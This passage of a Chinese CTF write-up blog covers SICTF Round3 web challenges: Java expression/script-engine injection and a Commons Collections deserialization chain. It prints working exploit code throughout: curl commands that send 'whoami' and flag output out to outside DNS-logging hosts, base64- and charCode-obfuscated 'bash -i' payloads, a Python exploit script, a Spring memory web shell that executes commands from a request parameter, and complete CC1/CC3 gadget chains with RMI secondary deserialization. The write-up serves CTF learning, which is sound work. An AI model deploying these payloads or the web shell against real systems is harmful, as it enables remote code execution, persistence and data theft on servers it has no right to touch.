class="hljs autohotkey">curl `whoami`.vabueyf6.requestrepo.com</code></pre></div><div class="code-wrapper"><pre><code class="hljs stylus">java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.Runtime</span><span class="hljs-selector-class">.getRuntime</span>()<span class="hljs-selector-class">.exec</span>(<span class="hljs-string">&quot;bash -c &#123;echo,Y3VybCBgd2hvYW1pYC52YWJ1ZXlmNi5yZXF1ZXN0cmVwby5jb20=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>)</code></pre></div><div class="code-wrapper"><pre><code class="hljs dns">$&#123;&quot;&quot;.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;js&quot;).eval(&quot;eval(String.fromCharCode(<span class="hljs-number">106,97,118,97</span>,<span class="hljs-number">46,108,97,110</span>,<span class="hljs-number">103,46,82,117</span>,<span class="hljs-number">110,116,105,109</span>,<span class="hljs-number">101,46,103,101</span>,<span class="hljs-number">116,82,117,110</span>,<span class="hljs-number">116,105,109,101</span>,<span class="hljs-number">40,41,46,101</span>,<span class="hljs-number">120,101,99,40</span>,<span class="hljs-number">34,98,97,115</span>,<span class="hljs-number">104,32,45,99</span>,<span class="hljs-number">32,123,101,99</span>,<span class="hljs-number">104,111,44,89</span>,<span class="hljs-number">51,86,121,98</span>,<span class="hljs-number">67,66,103,100</span>,<span class="hljs-number">50,104,118,89</span>,<span class="hljs-number">87,49,112,89</span>,<span class="hljs-number">67,53,50,89</span>,<span class="hljs-number">87,74,49,90</span>,<span class="hljs-number">88,108,109,78</span>,<span class="hljs-number">105,53,121,90</span>,<span class="hljs-number">88,70,49,90</span>,<span class="hljs-number">88,78,48,99</span>,<span class="hljs-number">109,86,119,98</span>,<span class="hljs-number">121,53,106,98</span>,<span class="hljs-number">50,48,61,125</span>,<span class="hljs-number">124,123,98,97</span>,<span class="hljs-number">115,101,54,52</span>,<span class="hljs-number">44,45,100,125</span>,<span class="hljs-number">124,123,98,97</span>,<span class="hljs-number">115,104,44,45</span>,<span class="hljs-number">105,125,34,41</span>,<span class="hljs-number">59</span>))&quot;)&#125;</code></pre></div><p><img src="/../images/SICTF-Round3/image-20240220225314409.png" alt="image-20240220225314409"></p><p>当然当时没有一个很好的接受dns的网站，导致我一直不确定是我的错了还是网站不行</p><p>现在看别人用的收集了一个（嘻嘻</p><h3 id="晨曦WP-1"><a href="#晨曦WP-1" class="headerlink" title="晨曦WP"></a>晨曦WP</h3><p>通过java的 charAt 与 toChars 获取字符，在由 toString 转字符串再用 concat 拼接来绕过一些敏感字符的过滤。</p><div class="code-wrapper"><pre><code class="hljs maxima">import requestsimport <span class="hljs-built_in">base64</span>def encode(payload):encode_payload = <span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, len(payload)):<span class="hljs-keyword">if</span> i == <span class="hljs-number">0</span>:encode_payload += <span class="hljs-string">&quot;true.toString().charAt(0).toChars(%d)[0].toString()&quot;</span> <span class="hljs-symbol">%</span> ord(payload[<span class="hljs-number">0</span>])<span class="hljs-keyword">else</span>:encode_payload += <span class="hljs-string">&quot;.concat(true.toString().charAt(0).toChars(%d)[0].toString())&quot;</span> <span class="hljs-symbol">%</span> ord(payload[i])<span class="hljs-built_in">return</span> encode_payload# 这里填命令cmd = b<span class="hljs-string">&quot;curl `/readflag`.kbqsag.ceye.io&quot;</span>#<span class="hljs-built_in">print</span>(<span class="hljs-built_in">base64</span>.b64encode(cmd))<span class="hljs-built_in">exp</span> = &#x27;$&#123;<span class="hljs-string">&quot;&quot;</span>.getClass().forName(<span class="hljs-string">&quot;javax.script.ScriptEngineManager&quot;</span>).newInstance().getEngineByName(<span class="hljs-string">&quot;JavaScript&quot;</span>).<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">%s</span>)&#125;&#x27; <span class="hljs-symbol">%</span> (encode(<span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,&quot;</span>+<span class="hljs-built_in">base64</span>.b64encode(cmd).decode()+<span class="hljs-string">&quot;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;)&quot;</span>))#<span class="hljs-built_in">print</span>(<span class="hljs-built_in">exp</span>)url = <span class="hljs-string">&quot;http://yuanshen.life:23333/test&quot;</span>data = &#123;&#x27;<span class="hljs-built_in">exp</span>&#x27;: <span class="hljs-built_in">exp</span>&#125;r = requests.post(url, data).text<span class="hljs-built_in">print</span>(r)</code></pre></div><p>太麻烦了，没我的方便</p><h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>预期是不出网的，等WP出了再补充</p><p>双层scriptenginemanager的eval解密base64，base64的内容为bcel打内存马</p><div class="code-wrapper"><pre><code class="hljs wren"><span class="hljs-title class_">String</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;$$BCEL$$&quot;</span><span class="hljs-operator">+</span> <span class="hljs-title class_">Utility</span>.<span class="hljs-property">encode</span>(<span class="hljs-title class_">Repository</span>.<span class="hljs-property">lookupClass</span>(<span class="hljs-variable">memshell</span>.<span class="hljs-property">class</span>).<span class="hljs-property">getBytes</span>(),<span class="hljs-literal">true</span>);<span class="hljs-title class_">String</span> <span class="hljs-variable">s2</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;new com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass(<span class="hljs-char escape_">\&quot;</span>&quot;</span><span class="hljs-operator">+</span><span class="hljs-variable">s1</span><span class="hljs-operator">+</span><span class="hljs-string">&quot;<span class="hljs-char escape_">\&quot;</span>).newInstance()&quot;</span>;<span class="hljs-title class_">String</span> <span class="hljs-variable">s3</span> <span class="hljs-operator">=</span> <span class="hljs-title class_">Base</span>64.<span class="hljs-property">getEncoder</span>().<span class="hljs-property">encodeToString</span>(<span class="hljs-variable">s2</span>.<span class="hljs-property">getBytes</span>());<span class="hljs-title class_">String</span> <span class="hljs-variable">s4</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;java.lang.Class.forName(<span class="hljs-char escape_">\\</span><span class="hljs-char escape_">\&quot;</span>javax.script.ScriptEngineManager<span class="hljs-char escape_">\\</span><span class="hljs-char escape_">\&quot;</span>).newInstance().getEngineByName(<span class="hljs-char escape_">\\</span><span class="hljs-char escape_">\&quot;</span>JavaScript<span class="hljs-char escape_">\\</span><span class="hljs-char escape_">\&quot;</span>).eval(new java.lang.String(java.util.Base64.getDecoder().decode(<span class="hljs-char escape_">\\</span><span class="hljs-char escape_">\&quot;</span>&quot;</span><span class="hljs-operator">+</span><span class="hljs-variable">s3</span><span class="hljs-operator">+</span><span class="hljs-string">&quot;<span class="hljs-char escape_">\\</span><span class="hljs-char escape_">\&quot;</span>)))&quot;</span>;<span class="hljs-title class_">String</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;$&#123;<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\&quot;</span>.getClass().forName(<span class="hljs-char escape_">\&quot;</span>javax.script.ScriptEngineManager<span class="hljs-char escape_">\&quot;</span>).newInstance().getEngineByName(<span class="hljs-char escape_">\&quot;</span>JavaScript<span class="hljs-char escape_">\&quot;</span>).eval(<span class="hljs-char escape_">\&quot;</span>&quot;</span><span class="hljs-operator">+</span><span class="hljs-variable">s4</span><span class="hljs-operator">+</span><span class="hljs-string">&quot;<span class="hljs-char escape_">\&quot;</span>)&#125;&quot;</span>;<span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-property">println</span>((<span class="hljs-variable">exp</span>));</code></pre></div><p>出题人的马没成功，改进了一下</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.PrintWriter;<span class="hljs-keyword">import</span> java.lang.reflect.Method;<span class="hljs-keyword">import</span> java.util.Scanner;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">memshell</span> &#123;    <span class="hljs-keyword">static</span> &#123;        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-type">Class</span> <span class="hljs-variable">requestContextHolder</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class="hljs-string">&quot;org.springframework.web.context.request.RequestContextHolder&quot;</span>);            <span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> requestContextHolder.getDeclaredMethod(<span class="hljs-string">&quot;getRequestAttributes&quot;</span>);            <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> m.invoke(<span class="hljs-literal">null</span>);            m = obj.getClass().getMethod(<span class="hljs-string">&quot;getRequest&quot;</span>);            <span class="hljs-type">Object</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> m.invoke(obj);            m = obj.getClass().getMethod(<span class="hljs-string">&quot;getResponse&quot;</span>);            <span class="hljs-type">Object</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> m.invoke(obj);            m = request.getClass().getMethod(<span class="hljs-string">&quot;getParameter&quot;</span>, String.class);            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> (String) m.invoke(request, <span class="hljs-string">&quot;cmd&quot;</span>);            <span class="hljs-keyword">if</span>(cmd == <span class="hljs-literal">null</span>)&#123;                cmd = <span class="hljs-string">&quot;id&quot;</span>;            &#125;            String[] cmds;            <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toUpperCase().contains(<span class="hljs-string">&quot;WIN&quot;</span>)) &#123;                cmds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, cmd&#125;;            &#125; <span class="hljs-keyword">else</span> &#123;                cmds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd&#125;;            &#125;            <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>).next();            m = response.getClass().getMethod(<span class="hljs-string">&quot;getWriter&quot;</span>);            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">printWriter</span> <span class="hljs-operator">=</span> (PrintWriter) m.invoke(response);            printWriter.println(output);            printWriter.flush();            printWriter.close();        &#125; <span class="hljs-keyword">catch</span> (Exception var11) &#123;        &#125;    &#125;&#125;</code></pre></div><p><img src="/../images/SICTF-Round3/image-20240225211458845.png" alt="image-20240225211458845"></p><h2 id="【进阶】CC-deserialize"><a href="#【进阶】CC-deserialize" class="headerlink" title="【进阶】CC_deserialize *"></a>【进阶】CC_deserialize *</h2><p>遗憾啊，0解题痛失一血，</p><p>截取的聊天段落</p><p><img src="/../images/SICTF-Round3/image-20240219180610100.png" alt="image-20240219180610100"></p><h3 id="思路完全是跟着出题人的hint走的"><a href="#思路完全是跟着出题人的hint走的" class="headerlink" title="思路完全是跟着出题人的hint走的"></a>思路完全是跟着出题人的hint走的</h3><p>所以才会写出预期解</p><p><img src="/../images/SICTF-Round3/image-20240219180831954.png" alt="image-20240219180831954"></p><p>rmi二次反序列化就不说了，自己去看</p><p><a href="http://tttang.com/archive/1701/#toc_rmiconnector">二次反序列化 看我一命通关 - 跳跳糖 (tttang.com)</a></p><p>关键点在这两处</p><p><img src="/../images/SICTF-Round3/image-20240219181336365.png" alt="image-20240219181336365"></p><p>总所周知，</p><div class="code-wrapper"><pre><code class="hljs xl">A<span class="hljs-function"><span class="hljs-title">nnotationInvocationHandler</span>.readObject-&gt;</span>A<span class="hljs-function"><span class="hljs-title">bstractInputCheckedMapDecorator</span>.setValue-&gt;</span>T<span class="hljs-function"><span class="hljs-title">ransformedMap</span>.checkSetValue-&gt;</span>InvokerTransformer.transform</code></pre></div><p>这是一个完整且普通的CC链，一般执行完transform弹出计算器我们就结束了</p><p>但这里我们可以继续利用</p><h3 id="关键点1"><a href="#关键点1" class="headerlink" title="关键点1"></a>关键点1</h3><p>执行完<code>transform</code>方法后的结果是会被返回回来的</p><p>在你调试完rmi二次反序列化之后，你会知道要想成功执行<code>RMIConnector</code>的<code>connect</code>方法，setValue的参数value要为我们设置的<code>RMIConnector</code>的对象</p><p>那这里就要考虑执行完transform方法后如何返回我们的恶意<code>RMIConnector</code>对象</p><p>这里熟悉所有CC链的师傅就会想到<code>ConstantTransformer</code></p><p><img src="/../images/SICTF-Round3/image-20240219182430047.png" alt="image-20240219182430047"></p><p>它的transform方法就是返回构造函数时传入他的参数</p><p>花了半个小时才想到</p><h3 id="关键点二"><a href="#关键点二" class="headerlink" title="关键点二"></a>关键点二</h3><p>我们正常的该链子可以看到这里的entry是<code>HashMap$Node</code>，之后就结束了</p><p><img src="/../images/SICTF-Round3/image-20240219182822810.png" alt="image-20240219182822810"></p><p>要想再次进入<code>AbstractInputCheckedMapDecorator.setValue</code></p><p>我们想办法把他变为</p><p><img src="/../images/SICTF-Round3/image-20240219182853501.png" alt="image-20240219182853501"></p><p>这里我是这样做的</p><div class="code-wrapper"><pre><code class="hljs coffeescript">HashMap&lt;<span class="hljs-built_in">Object</span>,<span class="hljs-built_in">Object</span>&gt; hash = <span class="hljs-keyword">new</span> HashMap&lt;<span class="hljs-built_in">Object</span>,<span class="hljs-built_in">Object</span>&gt;();hash.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">Object</span>,<span class="hljs-built_in">Object</span>&gt; transmap1 = TransformedMap.decorate(hash,<span class="hljs-literal">null</span>,invokerTransformer);ConstantTransformer constantTransformer = <span class="hljs-keyword">new</span> ConstantTransformer(rmiConnector);<span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">Object</span>,<span class="hljs-built_in">Object</span>&gt; transmap = TransformedMap.decorate(transmap1,<span class="hljs-literal">null</span>,constantTransformer);</code></pre></div><p><img src="/../images/SICTF-Round3/image-20240219183059030.png" alt="image-20240219183059030"></p><p>把实例化的<code>TransformedMap</code>当作Map传入另一个<code>TransformedMap</code>的<code>decorate</code>中</p><p><img src="/../images/SICTF-Round3/image-20240219183613934.png" alt="image-20240219183613934"></p><p>要说原因的话</p><p><img src="/../images/SICTF-Round3/image-20240219183259314.png" alt="image-20240219183259314"></p><p>TransformedMap是AbstractInputCheckedMapDecorator的实现类</p><p>emm，应该是吧，这样理解一下就行</p><h3 id="完整链子"><a href="#完整链子" class="headerlink" title="完整链子"></a>完整链子</h3><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<span class="hljs-keyword">import</span> javassist.*;<span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.AbstractMapEntryDecorator;<span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<span class="hljs-keyword">import</span> javax.management.remote.JMXServiceURL;<span class="hljs-keyword">import</span> javax.management.remote.rmi.RMIConnector;<span class="hljs-keyword">import</span> javax.naming.ConfigurationException;<span class="hljs-keyword">import</span> javax.xml.transform.Templates;<span class="hljs-keyword">import</span> java.io.*;<span class="hljs-keyword">import</span> java.lang.annotation.Target;<span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<span class="hljs-keyword">import</span> java.lang.reflect.Field;<span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<span class="hljs-keyword">import</span> java.util.Base64;<span class="hljs-keyword">import</span> java.util.HashMap;<span class="hljs-keyword">import</span> java.util.Map;<span class="hljs-keyword">import</span> java.util.Scanner;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIChain</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-type">JMXServiceURL</span> <span class="hljs-variable">jmxServiceURL</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JMXServiceURL</span>(<span class="hljs-string">&quot;service:jmx:rmi://&quot;</span>);        setFieldValue(jmxServiceURL, <span class="hljs-string">&quot;urlPath&quot;</span>, <span class="hljs-string">&quot;/stub/恶意base64&quot;</span>);        <span class="hljs-type">RMIConnector</span> <span class="hljs-variable">rmiConnector</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMIConnector</span>(jmxServiceURL, <span class="hljs-literal">null</span>);        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;connect&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);        HashMap&lt;Object,Object&gt; hash = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;Object,Object&gt;();        hash.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);        Map&lt;Object,Object&gt; transmap1 = TransformedMap.decorate(hash,<span class="hljs-literal">null</span>,invokerTransformer);        <span class="hljs-type">ConstantTransformer</span> <span class="hljs-variable">constantTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(rmiConnector);        Map&lt;Object,Object&gt; transmap = TransformedMap.decorate(transmap1,<span class="hljs-literal">null</span>,constantTransformer);        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);        constructor.setAccessible(<span class="hljs-literal">true</span>);        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class,transmap);        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);        oos.writeObject(instance);        oos.close();<span class="hljs-comment">//        String base64String = Base64.getEncoder().encodeToString(baos.toByteArray());</span><span class="hljs-comment">//        System.out.println(base64String);</span><span class="hljs-comment">//        System.out.println(base64String.length());</span>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray());        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);        ois.readObject();        ois.close();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String field, Object arg)</span> <span class="hljs-keyword">throws</span> Exception&#123;        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(field);        f.setAccessible(<span class="hljs-literal">true</span>);        f.set(obj, arg);    &#125;&#125;</code></pre></div><h3 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h3><p>遗憾的是这里并不出网，要打内存马</p><p>但是它限制了exp的长度不超过8000，（我不懂内存马，用了一个以前收集的一个，发现长度一万多）</p><p>这里直接心态爆炸</p><p>但其实我有找到回显方法，只不过我用的cc4的链子有问题 （本地都能弹计算器，我咋知道有问题</p><p>换了出题人的CC3后去复现就可以了，不知道为什么（服了</p><p>回到内存马，要用javassist去缩减payload长度</p><p>给出出题人的回显代码</p><div class="code-wrapper"><pre><code class="hljs reasonml">public static byte<span class="hljs-literal">[]</span> payload<span class="hljs-literal">()</span> throws NotFoundException, CannotCompileException, IOException &#123;    String s=<span class="hljs-string">&quot;public MyClassLoader()&#123;             javax.servlet.http.HttpServletRequest request = ((org.springframework.web.context.request.ServletRequestAttributes)org.springframework.web.context.request.RequestContextHolder.getRequestAttributes()).getRequest();\n&quot;</span> +            <span class="hljs-string">&quot;            java.lang.reflect.Field r=request.getClass().getDeclaredField(\&quot;request\&quot;);\n&quot;</span> +            <span class="hljs-string">&quot;            r.setAccessible(true);&quot;</span> +            <span class="hljs-string">&quot;            org.apache.catalina.connector.Response response =((org.apache.catalina.connector.Request) r.get(request)).getResponse();\n&quot;</span>+            <span class="hljs-string">&quot;            String s =new Scanner(Runtime.getRuntime().exec(request.getParameter(\&quot;cmd\&quot;)).getInputStream()).next();&quot;</span> +            <span class="hljs-string">&quot;            response.setHeader(\&quot;night\&quot;, s);&#125;&quot;</span>;    ClassPool classPool = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassPool</span>.</span></span>get<span class="hljs-constructor">Default()</span>;    classPool.import<span class="hljs-constructor">Package(Scanner.<span class="hljs-params">class</span>.<span class="hljs-params">getName</span>()</span>);    CtClass ctClass = classPool.get(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AbstractTranslet</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">Name()</span>);    CtClass calc = classPool.make<span class="hljs-constructor">Class(<span class="hljs-string">&quot;MyClassLoader&quot;</span>)</span>;    calc.set<span class="hljs-constructor">Superclass(<span class="hljs-params">ctClass</span>)</span>;    CtConstructor ctConstructor = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">CtNewConstructor</span>.</span></span>make(s, calc);    calc.add<span class="hljs-constructor">Constructor(<span class="hljs-params">ctConstructor</span>)</span>;    return calc.<span class="hljs-keyword">to</span><span class="hljs-constructor">Bytecode()</span>;&#125;</code></pre></div><h3 id="还是要用出题人的CC3，cc4我没成功"><a href="#还是要用出题人的CC3，cc4我没成功" class="headerlink" title="还是要用出题人的CC3，cc4我没成功"></a>还是要用出题人的CC3，cc4我没成功</h3><p>我是sb，都没common-collection4的依赖咋打cc4（服了</p><div class="code-wrapper"><pre><code class="hljs reasonml">public static String <span class="hljs-constructor">CC3Exp()</span> throws Exception &#123;    TemplatesImpl templates = <span class="hljs-keyword">new</span> <span class="hljs-constructor">TemplatesImpl()</span>;    Class tc = templates.get<span class="hljs-constructor">Class()</span>;    Field nameField = tc.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;_name&quot;</span>)</span>;    nameField.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;    nameField.set(templates, <span class="hljs-string">&quot;aaaa&quot;</span>);    Field bytecodesField = tc.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>)</span>;    bytecodesField.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;    byte<span class="hljs-literal">[]</span> code = payload1<span class="hljs-literal">()</span>;    byte<span class="hljs-literal">[]</span><span class="hljs-literal">[]</span> codes = &#123;code&#125;;    bytecodesField.set(templates, codes);    InstantiateTransformer instantiateTransformer = <span class="hljs-keyword">new</span> <span class="hljs-constructor">InstantiateTransformer(<span class="hljs-params">new</span> Class[]&#123;Templates.<span class="hljs-params">class</span>&#125;, <span class="hljs-params">new</span> Object[]&#123;<span class="hljs-params">templates</span>&#125;)</span>;    Transformer<span class="hljs-literal">[]</span> transformers = <span class="hljs-keyword">new</span> Transformer<span class="hljs-literal">[]</span>&#123;            <span class="hljs-keyword">new</span> <span class="hljs-constructor">ConstantTransformer(TrAXFilter.<span class="hljs-params">class</span>)</span>,            instantiateTransformer    &#125;;    ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ChainedTransformer(<span class="hljs-params">transformers</span>)</span>;    HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> HashMap&lt;&gt;<span class="hljs-literal">()</span>;    Map&lt;Object, Object&gt; lazyMap = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-constructor">ConstantTransformer(1)</span>);    TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> <span class="hljs-constructor">TiedMapEntry(<span class="hljs-params">lazyMap</span>, <span class="hljs-string">&quot;aaa&quot;</span>)</span>;    HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> HashMap&lt;&gt;<span class="hljs-literal">()</span>;    map2.put(tiedMapEntry, <span class="hljs-string">&quot;bbb&quot;</span>);    lazyMap.remove(<span class="hljs-string">&quot;aaa&quot;</span>);    Class&lt;LazyMap&gt; c = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span><span class="hljs-keyword">class</span>;    Field factoryField = c.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;factory&quot;</span>)</span>;    factoryField.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;    factoryField.set(lazyMap, chainedTransformer);    ByteArrayOutputStream bao = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayOutputStream()</span>;    <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjectOutputStream(<span class="hljs-params">bao</span>)</span>.write<span class="hljs-constructor">Object(<span class="hljs-params">map2</span>)</span>;    return <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Base64</span>.</span></span>get<span class="hljs-constructor">Encoder()</span>.encode<span class="hljs-constructor">ToString(<span class="hljs-params">bao</span>.<span class="hljs-params">toByteArray</span>()</span>).replace<span class="hljs-constructor">All(<span class="hljs-string">&quot;\\s*&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)</span>;&#125;</code></pre></div><h3 id="出题人的分析思路（其实一样啦"><a href="#出题人的分析思路（其实一样啦" class="headerlink" title="出题人的分析思路（其实一样啦"></a>出题人的分析思路（其实一样啦</h3><blockquote><p>首先走cc1动态代理链子的</p><p>AnnotationInvocationHandler.readObject-&gt;AbstractInputCheckedMapDecorator.setValue-&gt;TransformedMao.checkSetValue</p><p><img src="/../images/SICTF-Round3/d4b01f232d219.png" alt="d4b01f232d219"></p><p>反序列化的时候，AbstractInputCheckedMapDecorator.setValue中的entry.setValue(value);的entry还是AbstractInputCheckedMapDecorator，再次调用了当前这个方法</p><p><img src="/../images/SICTF-Round3/388b356bc2cbe.png" alt="388b356bc2cbe"></p><p>先进入了TransformedMap的checkSetValue，这时候调用valueTransformer.transform(value)，valueTransformer调用transform这时候返回的值为</p><p><img src="/../images/SICTF-Round3/77dec3e529cce.png" alt="77dec3e529cce"></p><p>ConstantTransformer，返回iConstant(rmi二次反序列化)</p><p><img src="/../images/SICTF-Round3/d8798274aa3d1.png" alt="image-20240129183701195"></p><p>再次调用entry.setValue(value);</p><p><img src="/../images/SICTF-Round3/23b6cc1edc25b.png" alt="image-20240129183917887"></p><p>这时候就是</p><p><img src="/../images/SICTF-Round3/f157e72bf885e.png" alt="image-20240129183942371"></p><p>调用了rmi二次反序列化了</p><p>所以链子为AnnotationInvocationHandler.readObject-&gt;AbstractInputCheckedMapDecorator.setValue-&gt;TransformedMap.checkSetValue-&gt;AbstractInputCheckedMapDecorator.setValue-&gt;TransformedMap.checkSetValue-&gt;InvokerTransformer.transform然后走rmi二次反序列化</p><p>且exp的字数统计不能大于8000</p><p>这个时候就是通过javassist去写一个马进去，来防止字数超过</p></blockquote><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p><img src="/../images/SICTF-Round3/image-20240219184457111.png" alt="image-20240219184457111"></p><p><img src="/../images/SICTF-Round3/image-20240219184506559.png" alt="image-20240219184506559"></p><h2 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h2><p>只能说非常可惜啊，从晚上十一二点开始看CC，没想到还是没做出来，sbCC4，唉</p><h3 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h3><p><a href="https://chenxi9981.github.io/SICTF_Round3/">SICTF Round3 | 晨曦的个人小站 (chenxi9981.github.io)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>VNCTF2024</title>
    <link href="/2024/02/17/VNCTF2024/"/>
    <url>/2024/02/17/VNCTF2024/</url>
    
